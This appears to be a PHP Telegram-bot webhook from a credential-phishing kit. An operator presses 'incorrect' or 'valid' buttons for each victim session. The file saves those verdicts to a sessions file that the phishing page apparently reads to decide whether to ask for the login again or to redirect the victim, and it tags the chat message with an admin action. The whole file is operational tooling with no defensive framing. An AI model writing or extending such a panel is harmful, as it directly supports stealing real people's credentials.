<?php
require_once 'config.php';

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (isset($update['callback_query'])) {
    $callback = $update['callback_query'];
    $data = $callback['data']; // e.g., "incorrect_ID" or "valid_ID"
    $chatId = $callback['message']['chat']['id'];
    $messageId = $callback['message']['message_id'];

    $parts = explode('_', $data);
    $action = $parts[0];
    $sid = $parts[1];

    $sessions = file_exists(SESSIONS_FILE) ? json_decode(file_get_contents(SESSIONS_FILE), true) : [];
    
    if ($action === 'incorrect') {
        $sessions[$sid] = 'incorrect';
        $answerText = "❌ Marked as Incorrect!";
    } elseif ($action === 'valid') {
        $sessions[$sid] = 'valid';
        $answerText = "✅ Marked as Valid / Redirecting...";
    }

    file_put_contents(SESSIONS_FILE, json_encode($sessions));

    // Acknowledge button click
    @file_get_contents("https://api.telegram.org/bot" . BOT_TOKEN . "/answerCallbackQuery?callback_query_id=" . $callback['id'] . "&text=" . urlencode($answerText));
    
    // Update message text in chat
    @file_get_contents("https://api.telegram.org/bot" . BOT_TOKEN . "/editMessageText?chat_id={$chatId}&message_id={$messageId}&text=" . urlencode($callback['message']['text'] . "\n\n<b>[ADMIN ACTION: " . strtoupper($action) . "]</b>") . "&parse_mode=HTML");
}
?>